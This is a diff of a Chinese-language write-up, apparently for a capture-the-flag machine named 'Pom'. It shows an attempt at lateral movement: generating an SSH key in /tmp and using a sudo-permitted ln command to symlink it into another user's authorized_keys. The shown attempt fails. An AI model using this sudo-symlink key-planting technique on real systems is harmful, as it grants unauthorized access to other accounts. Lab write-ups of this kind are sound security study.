@@ -526,4 +526,29 @@ User qc2000 may run the following commands on Pom:
 ```
 可以以`terra536`的权限运行`/home/terra536/ln`，很明显就是用软件接去横向。
 因为在/tmp目录所以都可以访问，估计就是把公钥链接到用户目录里面，这样就可以用私钥直接登录了。
-d's
+但是最后居然失败了，原因是因为没有
+```bash
+qc2000@Pom:/tmp$ ssh-keygen -t ed25519 -f /tmp/mykey -N ""
+Generating public/private ed25519 key pair.
+Your identification has been saved in /tmp/mykey
+Your public key has been saved in /tmp/mykey.pub
+The key fingerprint is:
+SHA256:jDOwXwqf5v0YkCsExou3T0uZHp8yNn9sEyRpPeL4Py4 qc2000@Pom
+The key's randomart image is:
++--[ED25519 256]--+
+|                 |
+| .               |
+|  + .  o         |
+| o o o=++        |
+|. o ++*+S.       |
+| . o.*.O.        |
+|  . B.B...       |
+|   ==BEo*o       |
+|   .+==*=+.      |
++----[SHA256]-----+
+qc2000@Pom:/tmp$ ls
+Exploit.class       Exploit.java        hsperfdata_mav1234  hsperfdata_qc2000   mykey               mykey.pub
+qc2000@Pom:/tmp$ chmod 777 /tmp/mykey.pub
+qc2000@Pom:/tmp$ sudo -u terra536 /home/terra536/ln -sf /tmp/mykey.pub /home/terra536/.ssh/authorized_keys
+ln: /home/terra536/.ssh/authorized_keys: No such file or directory
+```
